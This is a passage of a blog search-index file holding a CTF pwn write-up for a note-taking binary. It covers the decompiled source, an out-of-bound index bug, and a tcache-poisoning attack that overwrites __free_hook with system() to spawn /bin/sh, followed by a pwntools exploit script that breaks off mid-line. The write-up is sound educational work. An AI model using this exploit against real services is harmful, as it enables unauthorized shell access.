<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[Writeup] - JHT PWN</title>
      <link href="/2025/06/20/jht/"/>
      <url>/2025/06/20/jht/</url>
      
        <content type="html"><![CDATA[<p>Tag : CTF, Challenges, Heap, Tcache Poisoning</p><p>Link to chall : <a href="https://drive.google.com/file/d/1-hH-UsPbvmHr48W2HkY63XUVURYhMWvd/view?usp=sharing">https://drive.google.com/file/d/1-hH-UsPbvmHr48W2HkY63XUVURYhMWvd/view?usp=sharing</a></p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><code>menu()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Add a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Edit a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Remove a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Read a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Notebook v1.0 - Beta version&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A place where you can save your note!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_note(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit_note(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        remove_note(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        read_note(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_note()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">read_note</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( book[a1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Data: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)book[a1]); <span class="comment">// Out Of Bound</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No note here!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>remove_note()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">remove_note</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( book[a1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)book[a1]);</span><br><span class="line">      book[a1] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No note here!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>edit_note()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit_note</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( book[idx] )                            <span class="comment">// Out Of Bound</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="type">void</span> *)book[idx], (<span class="type">unsigned</span> <span class="type">int</span>)notesize[idx]);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No note here!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>add_note()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">add_note</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD size[<span class="number">3</span>]; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, size);</span><br><span class="line">    <span class="keyword">if</span> ( size[<span class="number">0</span>] &lt;= <span class="number">0x410u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      notesize[idx] = size[<span class="number">0</span>];</span><br><span class="line">      book[idx] = (__int64)<span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">memset</span>((<span class="type">void</span> *)book[idx], <span class="number">0</span>, size[<span class="number">0</span>]);    <span class="comment">// set all to 0</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="type">void</span> *)book[idx], size[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3><p><img src="/img/post/writeup/jht/checksec.png" alt="image.png"></p><h3 id="Build-idea"><a href="#Build-idea" class="headerlink" title="Build idea"></a>Build idea</h3><p>I can’t see the win() function to call flag or shell, so maybe i will do it for my own. We got <code>libc-2.31</code>, different to current version (<code>libc-2.40</code>) so i will try to take addvantage from it so for now my pseudo goal is <em>call shell from system</em>.</p><p>We got some <code>malloc</code>’s call and some <code>Out Of Bound</code> i noted on the source because of it only need </p><p><code>idx</code> no more than <code>4</code> and it is <code>unsigned int</code> so we can go below <code>0</code></p><p>Besides it i will go further for heap exploit.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>With <code>Out Of Bound (OOB)</code> we can : </p><ul><li>add note - write  address got malloc to somewhere</li><li>read note - read some value from somewhere, for now i think i need some address have libc address</li></ul><p>While debugging, i see two variable <code>notesize[]</code>, <code>book[]</code> is side by side </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x4040c0</span> (notesize) ◂— <span class="number">0xa00000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x4040c8</span> (notesize+<span class="number">8</span>) ◂— <span class="number">0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x4040e8</span> (book+<span class="number">8</span>) —▸ <span class="number">0x4052a0</span> ◂— <span class="string">&#x27;aaaaaaaa\n&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x4040f0</span> (book+<span class="number">16</span>) ◂— <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x4040f8</span> (book+<span class="number">24</span>) ◂— <span class="number">0</span></span><br></pre></td></tr></table></figure><p>and with <code>OOB</code> we can bypass this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">in <span class="title function_">edit_note</span><span class="params">()</span>:</span><br><span class="line"><span class="title function_">read</span><span class="params">(<span class="number">0</span>, (<span class="type">void</span> *)book[idx], (<span class="type">unsigned</span> <span class="type">int</span>)notesize[idx])</span>;</span><br><span class="line"></span><br><span class="line">in <span class="title function_">add_note</span><span class="params">()</span>:</span><br><span class="line"><span class="title function_">if</span> <span class="params">( size[<span class="number">0</span>] &lt;= <span class="number">0x410u</span> )</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>let me explain, when adding note, size it can’t be more than <code>0x410u</code> but because of <code>notesize</code> is array next to <code>book</code> so if we make a <code>book</code> with index &lt; 0 we can overwrite <code>notesize</code> with some value</p><p>So i will make a book[0] with size is 10 and a book[-4], then debug i think i can see something.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x4040c0</span> (notesize) —▸ <span class="number">0x4052c0</span> ◂— <span class="number">0xa342d342d342d</span> <span class="comment">/* &#x27;-4-4-4\n&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x4040c8</span> (notesize+<span class="number">8</span>) ◂— <span class="number">0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x4040e0</span> (book) —▸ <span class="number">0x4052a0</span> ◂— <span class="string">&#x27;abcdefg\n&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x4040e8</span> (book+<span class="number">8</span>) ◂— <span class="number">0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br></pre></td></tr></table></figure><p>with size of book[0] has size with notesize[0], but create another book[-4] will overwrite it to some malloc address and now, value of notesize[0] become to <code>0x4040c0</code> </p><p>so it means we can have input more than before.</p><p><img src="/img/post/writeup/jht/1.png" alt="image.png"></p><p>⇒ We got <code>Heap Overflow</code> </p><p>If we got <code>heap Overflow</code> so maybe we could use <code>tcache poisoning</code> technique. Unil now, my raw map I think is :</p><p><code>Heap Overflow</code> → <code>tcache poisoning</code> then we can call system, maybe.</p><p>To confirm that can use <code>tcache poisoning</code>, we must do some research because <code>tcache poisoning</code> is almost dependent on libc version, I need to check if this libc version (<code>libc-2.31</code>) have some vulnerabilities and i found <code>__malloc_hook</code> called when using <code>free()</code>.  </p><h3 id="Research"><a href="#Research" class="headerlink" title="Research"></a>Research</h3><p>Note : If you already know about <code>__malloc_hook</code> you can continue to exploit phase.</p><p>Do some research and i find this, it’s help me alots <a href="https://ctftime.org/writeup/34804">https://ctftime.org/writeup/34804</a></p><p>Let me explain, <code>Glibc &lt; 2.34</code> will have a memory for pre-free is <code>__malloc_hook</code> </p><p>with libc version i mentioned, when you call <code>free()</code> function, it will check <code>__malloc_hook</code> if exist data or not. I will show my deep road while dive in into <code>free()</code> in these pictures : </p><p>when you call <code>free()</code>, it will check if  <code>__malloc_hook</code> has some data, if not, do <code>free()</code> like normal action. It check by take the value  at <code>__free_hook</code> and assign it again for <code>rax</code> then call<br><code>test rax,rax</code> (AND bit) and <code>jne</code> (jump if not equal) and jump if <code>test</code> answer’s is <em>not zero</em>.  </p><p><img src="/img/post/writeup/jht/2.png" alt="image.png"></p><p>Here is <code>__free_hook</code> memory:</p><p><img src="/img/post/writeup/jht/3.png" alt="image.png"></p><p>⇒ So what if i got something for this memory ?</p><p>i overwrite value is <code>system</code> address in this function, and debug again so what we can see in it !</p><p><img src="/img/post/writeup/jht/4.png" alt="image.png"></p><p>So <code>test rax,rax</code> do some FLAG stuff and will jump to <code>free+152</code></p><p><img src="/img/post/writeup/jht/5.png" alt="image.png"></p><p>And you can see in the pictures, it will lead to <code>jmp rax</code> at <code>free+161</code><br>and <code>rax</code> is a value of <code>__free_hook</code> - the address i setup - <code>address system</code> </p><p>In summary, it means :</p><p><strong>with <code>Glibc &lt; 2.34</code>, will exist a memory name <code>__free_hook</code> and when you call <code>free()</code>, it will check for this memory if it exist some value, it will jump into that value, but if not, free as normal. Take advantage from it, we could prepare poison  for tcache in these  versions.</strong></p><h3 id="Attack-road"><a href="#Attack-road" class="headerlink" title="Attack road"></a>Attack road</h3><p>We need <code>system()</code> address in libc written into <code>__malloc_hook</code>, we need <code>rdi</code> is an address has value <code>“/bin/sh”</code></p><p>Luckily, the way we exploit <code>__malloc_hook</code> won’t change anything while call <code>free(arg)</code>, <code>rdi</code> always be <code>arg</code>. You can look back to final pictures, i freed a memory with data is <code>“/bin/sh”</code> and rdi still got that. It means we only set up for <code>system()</code>.</p><p>I always find root by follow its branch, so I will find way by reverse the way : </p><p><code>__malloc_hook</code> has <code>system()</code> address → <code>Tcache poisoning</code> → <code>Heap overflow</code> can overwrite linked address → <code>Out Of Bound</code>  for overwrite size of book + <code>leak libc</code> address</p><p>I use <code>read_note()</code> to read a value from an address, And with my experiment, <code>GOT</code> always has libc address, so if i can find some address calling to GOT address, it can leak libc address.</p><p>You can see that I search for <code>scanf</code> address for somewhere and find in <code>0x400798</code>. </p><p><img src="/img/post/writeup/jht/6.png" alt="image.png"></p><p>calculate from <code>book[]</code>, the index is <code>-1833</code>, build payload and decode, I got libc address.</p><p>→ We could find <code>System()</code> address.</p><p>For <code>tcache poisoning</code>, we will using <code>heap overflow</code> and to use it, we need to overwrite size of book i mentioned before, so here is how I do it :</p><ul><li>Create 3 books with index 0, 2, 3. Im not using index 1 because if you overwrite notesize - 4 byte with 8 byte, index 1 will affected, so to avoid it, use 2 and 3 or more.</li></ul><p><img src="/img/post/writeup/jht/7.png" alt="image.png"></p><ul><li>Free index 3 then to 2 for tcache linked</li></ul><p><img src="/img/post/writeup/jht/8.png" alt="image.png"></p><ul><li>Create a <code>book[-4]</code> and overwrite size of <code>book[0]</code> ⇒ Bypass size of note.</li></ul><p><img src="/img/post/writeup/jht/9.png" alt="image.png"></p><ul><li>Padding until Overwrite the linked address</li></ul><p><img src="/img/post/writeup/jht/10.png" alt="image.png"></p><p><img src="/img/post/writeup/jht/11.png" alt="image.png"></p><ul><li>Malloc with that size again and we got a variable with data pointed into __free_hook and add <code>system()</code> address.</li></ul><p><img src="/img/post/writeup/jht/12.png" alt="image.png"></p><p>Every thing has been setup,call <code>remove_note()</code> and debug at <code>free()</code> to see what happen : </p><p><img src="/img/post/writeup/jht/13.png" alt="image.png"></p><p>It will jump to <code>rax</code>, the <code>system()</code> address with <code>rdi</code> is a memory with <code>“/bin/sh&quot;</code></p><p><em>PWN ! Did your brain got poisoned ?</em> </p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def <span class="title function_">add_note</span><span class="params">(p,idx,size,data)</span>:</span><br><span class="line">    idx = idx.encode()</span><br><span class="line">    size = size.encode()</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>,b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index&#x27;</span>,idx)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Size: &#x27;</span>,size)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Data: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">def edit_note(p,idx,data):</span><br><span class="line">    idx = idx.encode()</span><br><span class="line">    <span class="meta"># data = data.encode()</span></span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>,b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index&#x27;</span>,idx)</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Data: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">def remove_note(p,idx):</span><br><span class="line">    idx = idx.encode()</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>,b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index&#x27;</span>,idx)</span><br><span class="line"></span><br><span class="line">def read_note(p,idx):</span><br><span class="line">    idx = idx.encode()</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>,b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index&#x27;</span>,idx)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">2</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./&quot;</span> + sys.argv[<span class="number">1</span>])</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + sys.argv[<span class="number">1</span>], checksec=False)</span><br><span class="line"></span><br><span class="line">    gdb.attach(p,</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">b*add_note+<span class="number">166</span></span><br><span class="line">b*remove_note+<span class="number">115</span></span><br><span class="line">b*read_note</span><br><span class="line">b*edit_note</span><br><span class="line">c</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr = sys.argv[<span class="number">1</span>]</span><br><span class="line">    remote_port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    p = remote(remote_addr, <span class="type">int</span>(remote_port))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">########## LEAK LIBC ##########  </span><br><span class="line">read_note(p,<span class="string">&#x27;-1833&#x27;</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">libc_leak = p.recv(<span class="number">6</span>) + b<span class="string">&#x27;\0&#x27;</span>*<span class="number">2</span></span><br><span class="line">libc_leak = u64(libc_leak)</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&#x27;libc leak : &#x27;</span> + hex(libc_leak))</span><br><span class="line">offet_to_libc_base = <span class="number">0x59140</span></span><br><span class="line">libc_base = libc_leak - offet_to_libc_base</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&#x27;libc base : &#x27;</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">######### OVERWRITE __FREE_HOOK ##########</span><br><span class="line">add_note(p,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,b<span class="string">&#x27;this is 0&#x27;</span>)</span><br><span class="line">add_note(p,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,b<span class="string">&#x27;this is 2&#x27;</span>)</span><br><span class="line">add_note(p,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,b<span class="string">&#x27;this is 3&#x27;</span>)</span><br><span class="line">remove_note(p,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">remove_note(p,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset_to_free_hook = <span class="number">0x1c5b28</span></span><br><span class="line">offset_to_system = <span class="number">0x49970</span></span><br><span class="line">free_hook = libc_base + offset_to_free_hook</span><br><span class="line">system = libc_base + offset_to_system</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">144</span> +  p64(free_hook)</span><br><span class="line">add_note(p,<span class="string">&#x27;-4&#x27;</span>,<span class="string">&#x27;256&#x27;</span>,b<span class="string">&#x27;poison&#x27;</span>)</span><br><span class="line">edit_note(p,<span 